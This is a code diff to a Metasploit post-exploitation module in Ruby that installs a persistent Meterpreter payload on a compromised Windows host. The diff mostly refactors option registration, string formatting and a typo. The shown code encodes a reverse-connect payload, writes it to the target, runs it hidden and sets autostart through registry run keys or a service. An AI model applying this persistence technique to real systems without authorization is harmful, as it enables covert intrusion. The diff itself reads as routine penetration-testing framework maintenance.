@@ -67,10 +67,7 @@ class Metasploit3 < Msf::Post
 				OptBool.new('EXEC', [true, 'Execute the payload as soon as it\'s uploaded.', true]),
 				# ACTION=MSF
 				OptAddress.new('LHOST', [false, 'IP for Meterpeter payload to connect to.']),
-				OptEnum.new('PAYLOAD_TYPE', [false, 'Meterpreter payload type.', 'TCP', ['TCP', 'HTTP', 'HTTPS']]),
-				OptInt.new('DELAY', [false, 'Delay (in seconds) at startup until Meterpreter tries to connect back.', 5]),
 				OptInt.new('LPORT', [false, 'Port for Meterpeter payload to connect to.']),
-				OptString.new('TEMPLATE', [false, 'Alternate Windows PE file to use as a template for Meterpreter.']),
 				# ACTION=CUSTOM
 				OptString.new('REXE', [false, 'Local path to the custom executable to use remotely.']),
 				OptString.new('REXENAME',[false, 'The filename of the custom executable to use on the remote host.'])
@@ -78,9 +75,12 @@ class Metasploit3 < Msf::Post
 
 		register_advanced_options(
 			[
-				OptString.new('OPTIONS', [false, 'Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.']),
-				OptString.new('ENCODER', [false, 'Encoder name to use for encoding.', 'x86/shikata_ga_nai']),
+				OptEnum.new('PAYLOAD_TYPE', [false, 'Meterpreter payload type.', 'TCP', ['TCP', 'HTTP', 'HTTPS']]),
+				OptInt.new('DELAY', [false, 'Delay (in seconds) at startup until Meterpreter tries to connect back.', 5]),
 				OptInt.new('ITERATIONS', [false, 'Number of iterations for encoding.', 5]),
+				OptString.new('ENCODER', [false, 'Encoder name to use for encoding.', 'x86/shikata_ga_nai']),
+				OptString.new('OPTIONS', [false, 'Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.']),
+				OptString.new('TEMPLATE', [false, 'Alternate Windows PE file to use as a template for Meterpreter.'])
 			], self.class)
 	end
 
@@ -88,7 +88,7 @@ class Metasploit3 < Msf::Post
 	#-------------------------------------------------------------------------------
 	def run
 		# Set vars
-		action = datastore['ACTION'].upcase
+		action = datastore['ACTION'] || 'MSF'
 		delay = datastore['DELAY']
 		encoder = datastore['ENCODER']
 		exec = datastore['EXEC']
@@ -122,14 +122,14 @@ class Metasploit3 < Msf::Post
 				return
 			end
 
-			if !lport.between?(1, 65535)
+			if not lport.between?(1, 65535)
 				print_error("Please set LPORT")
 				return
 			end
 
 			# Check to see if the template file actually exists
-			if tempate
-				if not ::File.exists?(tempate)
+			if template
+				if not ::File.exists?(template)
 					print_error "Template file doesn't exists"
 					return
 				end
@@ -163,7 +163,7 @@ class Metasploit3 < Msf::Post
 			end
 
 			if not rexename =~ /\.exe$/
-				rexename += '.exe'
+				rexename = "#{rexename}.exe"
 			end
 		else
 			print_error("Unknwon ACTION (#{action})")
@@ -178,7 +178,7 @@ class Metasploit3 < Msf::Post
 			pay = create_payload(payload, lhost, lport, opts = "")
 			raw = pay_gen(pay, encoder, iterations)
 			script = create_script(delay, template, raw)
-			script_on_target = write_to_target(script, path, rexename)
+			script_on_target = write_to_target(script, path)
 		else
 			raw = create_payload_from_file(rexe)
 			script_on_target = write_to_target(raw, path, rexename)
@@ -199,9 +199,9 @@ class Metasploit3 < Msf::Post
 
 		case startup
 			when /USER/i
-				write_to_reg("HKCU",script_on_target)
+				write_to_reg("HKCU", script_on_target)
 			when /SYSTEM/i
-				write_to_reg("HKLM",script_on_target)
+				write_to_reg("HKLM", script_on_target)
 			when /SERVICE/i
 				install_as_service(script_on_target)
 			end
@@ -316,7 +316,7 @@ class Metasploit3 < Msf::Post
 	#-------------------------------------------------------------------------------
 	def write_script_to_target(vbs)
 		tempdir = session.fs.file.expand_path("%TEMP%")
-		tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
+		tempvbs = "#{tempdir}\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
 		fd = session.fs.file.new(tempvbs, "wb")
 		fd.write(vbs)
 		fd.close
@@ -377,9 +377,11 @@ class Metasploit3 < Msf::Post
 	#-------------------------------------------------------------------------------
 	def target_exec(script_on_target)
 		print_status("Executing payload #{script_on_target}")
+
 		proc = action == 'MSF' ? session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true}) :\
 			session.sys.process.execute(script_on_target, nil, {'Hidden' => true})
 		print_good("Payload executed with PID #{proc.pid}")
+
 		@clean_up_rc << "kill #{proc.pid}\n"
 		return proc.pid
 	end
@@ -417,10 +419,11 @@ class Metasploit3 < Msf::Post
 	#-------------------------------------------------------------------------------
 	def write_to_target(vbs, path, rexename="")
 		tempdir = session.fs.file.expand_path(path)
+
 		if rexename
-			tempvbs = tempdir + "\\" + rexename
+			tempvbs = "#{tempdir}\\#{rexename}"
 		else
-			tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
+			tempvbs = "#{tempdir}\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
 		end
 
 		if file? tempvbs
@@ -445,7 +448,7 @@ class Metasploit3 < Msf::Post
 	# Function to read in custom binary
 	#-------------------------------------------------------------------------------
 	def create_payload_from_file(filein)
-		print_status("Using #{filein} as the payload") if datastore['VERBOSE']
+		vprint_status("Using #{filein} as the payload")
 		return ::IO.read(filein)
 	end
 end
